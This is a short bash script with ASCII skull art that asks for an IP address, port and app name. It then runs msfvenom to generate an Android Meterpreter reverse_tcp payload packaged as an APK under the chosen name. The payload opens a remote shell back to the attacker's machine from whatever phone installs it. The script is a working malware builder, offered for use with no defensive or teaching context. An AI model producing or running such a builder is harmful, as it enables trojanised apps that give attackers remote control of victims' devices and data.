#!/bin/bash
echo "hello!"
echo "Please Enter Your Ip address"
read ip
echo "If u dont know your ip just type in your terminal (ifconfig) and it will show, your own IP"
echo "Please Enter The Port Number"
read port
echo "Please Enter The APK's name U want to display"
read name
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R> $name.apk
echo "know U have Your apk"
echo "Have a nice day"
ls
         _,.-------.,_
     ,;~'             '~;,
   ,;                     ;,
  ;                         ;
 ,'                         ',
,;                           ;,
; ;      .           .      ; ;
| ;   ______       ______   ; |
|  `/~"     ~" . "~     "~\'  |
|  ~  ,-~~~^~, | ,~^~~~-,  ~  |
 |   |        }:{        |   |
 |   l       / | \       !   |
 .~  (__,.--" .^. "--.,__)  ~.
 |     ---;' / | \ `;---     |
  \__.       \/^\/       .__/
   V| \                 / |V
    | |T~\___!___!___/~T| |
    | |`IIII_I_I_I_IIII'| |
    |  \,III I I I III,/  |
     \   `~~~~~~~~~~'    /
       \   .       .   /
         \.    ^    ./
           ^~~~^~~~^



